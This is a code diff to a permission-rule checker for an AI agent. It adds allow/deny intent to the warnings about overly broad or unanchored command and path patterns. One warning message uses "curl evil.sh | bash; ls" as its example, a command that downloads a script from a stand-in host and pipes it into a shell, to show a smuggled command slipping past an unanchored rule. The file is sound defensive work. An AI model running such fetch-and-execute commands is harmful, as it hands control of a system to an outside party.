@@ -60,6 +60,28 @@ function isFullyAnchored(pattern: string): boolean {
 }
 
 /**
+/**
+ * A pattern that is only wildcards between its anchors — `^.*$` and its
+ * spellings. Extracted to a named constant so the check and the warning text
+ * cannot drift apart, and so it reads as a rule rather than as punctuation.
+ */
+const ONLY_WILDCARDS_BETWEEN_ANCHORS = /^\^[.*+()\\sSwWdD\[\]{}|?]*\$$/;
+
+/**
+ * What the rule being written will do, for warnings that must describe it.
+ *
+ * `effect` matters because a broad rule is a completely different mistake in
+ * each direction. A wide *allow* removes a protection; a wide *deny* removes a
+ * capability. Both are worth saying and neither message is true of the other,
+ * so the warnings are written twice rather than phrased vaguely enough to cover
+ * both — a warning an operator has to translate is one they stop reading.
+ */
+export type RuleIntent = {
+  effect?: "allow" | "deny";
+  access?: "read" | "write";
+};
+
+/**
  * Warnings for a pattern that is about to be stored.
  *
  * The central fact an operator has to internalise is that matching is a
@@ -69,46 +91,95 @@ function isFullyAnchored(pattern: string): boolean {
  * dashboard said nothing — so the one place the mistake is actually made was
  * the one place with no warning.
  */
-export function describeRuleRisks(pattern: string, resourceKind: string): RuleWarning[] {
+export function describeRuleRisks(
+  pattern: string,
+  resourceKind: string,
+  intent: RuleIntent = {},
+): RuleWarning[] {
   const warnings: RuleWarning[] = [];
   const trimmed = pattern.trim();
+  const denies = intent.effect === "deny";
+
+  // A denial narrowed to one direction is the most surprising thing the rule
+  // language can express, so it is called out whatever the pattern looks like.
+  // "Forbid reading this" leaving writing permitted is not what an operator
+  // means nine times out of ten, and nothing else on the page would say so.
+  if (denies && intent.access) {
+    const forbidden = intent.access === "read" ? "reading" : "writing to";
+    const stillAllowed = intent.access === "read" ? "writing to" : "reading";
+    warnings.push({
+      code: "narrowed-denial",
+      message:
+        `This forbids ${forbidden} the matching paths and nothing else, so ` +
+        `${stillAllowed} them is still permitted by this rule. Remove the ` +
+        `read/write narrowing to forbid both directions.`,
+    });
+  }
 
   // Matches every resource of its kind. Shares its list with the clash
   // detector so the two cannot disagree about what "everything" means.
   if (UNIVERSAL_PATTERNS.has(trimmed)) {
-    warnings.push({
-      code: "matches-everything",
-      message:
-        `This allows every ${resourceKind} the agent could attempt, which removes ` +
-        `the restriction entirely for this kind. If that is intended, prefer a ` +
-        `short time limit so it cannot be forgotten.`,
-    });
+    warnings.push(
+      denies
+        ? {
+            code: "denies-everything",
+            message:
+              `This forbids every ${resourceKind} the agent could attempt, so it will ` +
+              `be unable to do anything of this kind at all — including work an ` +
+              `existing allow rule permits, because denials are evaluated first. If ` +
+              `you meant to restrict one thing, narrow the pattern.`,
+          }
+        : {
+            code: "matches-everything",
+            message:
+              `This allows every ${resourceKind} the agent could attempt, which removes ` +
+              `the restriction entirely for this kind. If that is intended, prefer a ` +
+              `short time limit so it cannot be forgotten.`,
+          },
+    );
     return warnings;
   }
 
   if (!isFullyAnchored(trimmed)) {
     warnings.push({
       code: "unanchored",
-      message:
-        `This is not anchored with ^ and $, so it matches anywhere inside the ` +
-        `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
-        `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
-        `exact ${resourceKind}.`,
+      message: denies
+        ? `This is not anchored with ^ and $, so it matches anywhere inside the ` +
+          `${resourceKind} rather than describing the whole of it — a rule of "rm" ` +
+          `also forbids "confirm" and "format". Blocking more than intended is ` +
+          `safer than blocking less, but it is still worth knowing. Write "^rm$" ` +
+          `to forbid only that exact ${resourceKind}.`
+        : `This is not anchored with ^ and $, so it matches anywhere inside the ` +
+          `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
+          `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
+          `exact ${resourceKind}.`,
     });
   }
 
   // `.*` inside an anchored pattern is fine and common (`^ls .*$`); a pattern
   // that is *only* wildcards between its anchors is not.
-  if (isFullyAnchored(trimmed) && /^\^[.*+()\\sSwWdD\[\]{}|?]*\$$/.test(trimmed)) {
+  if (isFullyAnchored(trimmed) && ONLY_WILDCARDS_BETWEEN_ANCHORS.test(trimmed)) {
     warnings.push({
       code: "anchored-but-universal",
-      message:
-        `This is anchored but its body matches any ${resourceKind}, so it grants ` +
-        `everything of this kind.`,
+      message: denies
+        ? `This is anchored but its body matches any ${resourceKind}, so it forbids ` +
+          `everything of this kind.`
+        : `This is anchored but its body matches any ${resourceKind}, so it grants ` +
+          `everything of this kind.`,
     });
   }
 
   return warnings;
+}
+
+/** True only for a value the rule model accepts as an effect. */
+export function isRuleEffect(value: unknown): value is "allow" | "deny" {
+  return value === "allow" || value === "deny";
+}
+
+/** True only for a value the rule model accepts as an access narrowing. */
+export function isRuleAccess(value: unknown): value is "read" | "write" {
+  return value === "read" || value === "write";
 }
 
 export type TtlValidation = { ok: true; expiresAt?: string } | { ok: false; error: string };
